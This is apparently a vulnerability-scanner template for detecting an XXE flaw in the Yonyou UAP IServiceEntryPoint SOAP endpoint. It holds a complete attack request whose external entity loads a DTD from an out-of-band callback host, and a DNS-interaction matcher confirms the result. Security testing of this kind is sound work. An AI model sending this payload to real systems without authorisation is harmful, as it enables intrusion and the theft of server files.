id: yonyou-UAP-IServiceEntryPoint-xxe

info:
  name: yonyou-UAP-IServiceEntryPoint-xxe
  author: apple
  severity: critical
  description: yonyou-UAP-IServiceEntryPoint-xxe
  reference:
    - https://github.com/northfine/Easy-Ftpserver-By-Python
  tags: yonyou

http:
  - raw:
      - |-
        POST /uapws/service/nc.uap.oba.word.webservice.IServiceEntryPoint HTTP/1.1
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        SOAPAction: urn:getResult
        Content-Type: text/xml;charset=UTF-8
        Host: {{Hostname}}
        Content-Length: 458

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iser="http://webservice.word.oba.uap.nc/IServiceEntryPoint">
           <soapenv:Header/>
           <soapenv:Body>
              <iser:getResult>
                 <!--type: string-->
                 <iser:string><![CDATA[
        <!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://{{interactsh-url}}/tl.dtd">%aaa;%ccc;%ddd;]>
        <xxx/>]]></iser:string>
              </iser:getResult>
           </soapenv:Body>
        </soapenv:Envelope>
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"